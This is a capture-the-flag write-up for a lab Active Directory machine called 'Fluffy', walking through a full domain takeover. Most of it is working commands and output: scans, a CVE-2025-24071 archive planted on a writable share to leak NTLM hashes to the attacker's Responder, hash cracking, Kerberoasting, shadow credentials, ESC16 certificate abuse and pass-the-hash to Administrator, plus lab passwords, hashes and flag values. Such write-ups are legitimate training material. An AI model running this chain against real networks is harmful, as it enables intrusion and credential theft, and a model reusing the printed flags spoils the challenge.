
# CTF Writeup: Fluffy

---

We get the provided credentials:

```
j.fleischman / J0elTHEM4n1990!
```
## Reconnaissance

An initial scan revealed the following running services on the target server.

```
nmap -n -Pn -sS -p- 10.129.232.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 10:24 -0500
Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 55.65% done; ETC: 10:27 (0:01:21 remaining)
Nmap scan report for 10.129.232.88
Host is up (0.062s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49698/tcp open  unknown
49711/tcp open  unknown
49724/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 213.73 seconds
```

An more detailled scan revealed information about the running services.

```
nmap -n -Pn -sSCV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49698,49711,49724 10.129.232.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 10:29 -0500
Nmap scan report for 10.129.232.88
Host is up (0.050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-22 22:29:31Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-22T22:31:01+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-22T22:31:01+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-06-22T22:31:01+00:00; +6h59m58s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-22T22:31:01+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-22T22:30:23
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.15 seconds
```

Judging from the nmap scan the box itself seems to be an DC. We can retrieve an hostname, an DNS Name & a Domainname. Let's map them all to the target IP in our local DNS File.

```
echo "10.129.232.88 DC01.fluffy.htb fluffy.htb DC01" | tee -a /etc/hosts
```

Let's utilize the credentials to check what we can do with them.

I was able to enumerate shares using the set credentials. There is an non-default Share called "IT" in which we have READ & WRITE Permissions. Let's check it out.

```
nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

I connected to the SMB Share.

```
smbclient \\\\fluffy.htb/IT -U j.fleischman
```

Downloaded all files onto local machine.

```
recurse ON
prompt OFF
mget *
```

I inspected the .PDF File it seemed to be an .pdf created from the Infrastructure Team which listed all 

```
evince Upgrade_Notice.pdf
```

The List:

```
CVE-2025-24996
CVE-2025-24071
CVE-2025-46785
CVE-2025-29968
CVE-2025-21193
```

The first two CVE's seem rather interesting since both can be abused with NTLM Auth. This gives me major hints to perform an NTLM Relay Attack since I have WRITE perms on the SMB Share. Let's abuse CVE-2025-24071 to potentially retrieve an NTLM Hash!

I found the following exploit on GitHub and downloaded it onto my local machine.

```
git clone https://github.com/ex-cal1bur/SMB_CVE-2025-24071.git
```

I gave the script executable rights.

```
chmod +x poc_tar.py
```

Moved on and ran the exploit. Apparently running it will be generate an python script. 

```
python3 poc_tar.py
exploit
10.10.15.9
```

I started up my responder.

```
responder -I tun0
```

I then connected to the SMB Share in which we got WRITE Permissions.

```
smbclient \\\\fluffy.htb/IT -U j.fleischerman
```

I then uploaded the .tar file and unzipped it.

```
put exploit.tar
tar x exploit.tar
```

Captured the following NTLM Hash for user "p.agila".

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:056780a19f35dda4:596BBA73AEFF3F46597490BEA9111DA6:010100000000000080F972D33602DD017EBE933B4C088D5D0000000002000800450043004200410001001E00570049004E002D0051004B0058004D005A004B00320056004D004700510004003400570049004E002D0051004B0058004D005A004B00320056004D00470051002E0045004300420041002E004C004F00430041004C000300140045004300420041002E004C004F00430041004C000500140045004300420041002E004C004F00430041004C000700080080F972D33602DD0106000400020000000800300030000000000000000100000000200000FA8022795347FABF26AE14F90873C327E97C97A483995A620F9403F48BA271820A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0039000000000000000000
```

Cracked the hash using john the ripper and retrieved plaintext password for user p.agila.

```
john p.agila --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2026-06-22 11:17) 0.5780g/s 2611Kp/s 2611Kc/s 2611KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

```
p.agila:prometheusx-303
```

I tried to spray important services using the newly discovered credentials but oddly enough we still didn't get shell anywhere. Let's enumerate users.

```
nxc smb fluffy.htb -u p.agila -p 'prometheusx-303' --rid-brute > newusers.txt
```

I formatted the users wordlist so I can utilize it to spray with "nxc".

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed with nxc, but the passwords can't be reused for other accounts.
I tried enumerating ldap authenticated but I wasn't able to find anything useful there.

```
ldapsearch -H "ldap://fluffy.htb" -D p.agila@fluffy.htb -w 'prometheusx-303' -b "dc=fluffy,dc=htb" "*" > ldapsearch.txt
```

I decided to move on with enumerating domain information using bloodhound. This didn't work! Since I couldn't request an TGT for both of the owned users.

I then decided to start Kerberoasting with the previously discovered user "p.agila".

```
impacket-GetUserSPNs -request -dc-ip 10.129.232.88 fluffy.htb/p.agila
```

It revealed that we can request the TGT's for user 3 service accounts.
But we have clock skew.

Let's fix this!

```
timedatectl set-ntp off
```

Sync the time of my machine with the time of the DC.

```
rdate -n 10.129.232.88
```

Requested the TGT's and stored them in seperate files.

```
impacket-GetUserSPNs -request -dc-ip 10.129.232.88 fluffy.htb/p.agila
```

I then proceeded with bruteforcing the hash valus using john the ripper, but it didn't work. I also wasn't able to download domain information.

Moved on with trying to ASREP-Roast anything useful, but couldn't find anything.

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py fluffy.htb/ -usersfile users.txt -dc-ip 10.129.19.236
```

I decided to try hashcat for bruteforcing the TGT's but it also didn't work out. I moved back to trying to get domain information using bloodhound-python and this time I waited a longer time and I got it. Started up bloodhound and uploaded the .json files.

```
neo4j console
bloodhound
```

But I wasn't able to find any escalation vector. I then decided to research and found about an tool called "rusthound-ce" which allows me to download special certificate domain information which bloodhound-python doesn't do! 

Downloaded domain information using "rusthound-ce" and uploaded it to bloodhound.

```
rusthound-ce --domain fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
```

After uploading the freshly gathered domain information we see 4 Outbound Object Controls for our user j.fleischman. He can enroll in certificates. Which is very interesting. User "p.agila" seems to be part of the "Service Account Manager" Group which has "GenericAll" over "Service Accounts". Let's abuse this! I know that we can change the passwords of users when GenericAll is activated, since we know about 3 Service Accounts on the Domain Controller we can add our current user to the Service Account Group, which has GenericWrite over the 3 service accounts!

I added my current user to the group "Service Accounts". In order to proceed with priv esc.

```
bloodyad -u p.agila -p prometheusx-303 -d fluffy.htb -H dc01.fluffy.htb add groupMember 'service accounts' p.agila
```

Since we have GenericWrite over the service accounts, we could change there password which could lead to account outlock tho. That's why I will create shadow creds using "certipy".

```
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb
```

Did the same for ca_svc user.

```
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb
```

We ran the following command in order to check if there is any Priv Esc Vectors we can use as the ca_svc account and it seems that ESC16 is available.

```
certipy-ad find -username 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -target FLUFFY-DC01-CA

```

1. Update our current user's UPN to Administrator

This allows us to request the admin.pfx file.

```
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn administrator update
```

2. Request .pfx file

```
certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator@fluffy.htb -target dc01.fluffy.htb -target-ip 10.129.232.88
```

Since we now got the administrator.pfx file, we will update the upn of ca_svc from "administrator" back to ca_svc. So when we authenticate with the administrator.pfx it will provide us the NTLM Hash of the Domain Admin.

3. Revert back to service account, so we can auth as domain admin

```
certipy-ad account -u p.agila -p 'prometheusx-303' -dc-ip 10.129.232.88 -user ca_svc -upn ca_svc update
```

4. Request NTLM Hash of Domain Admin user using administrator.pfx

```
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb
```

Logged into DC01 as Administrator.

```
impacket-psexec Administrator@fluffy.htb -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Retrieved user.txt in C:\Users\winrm_svc\Desktop

```
3b9c1799d317578eede563fef0ac8b36
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
d751a91d46f8157fae9a01b7be400cac
```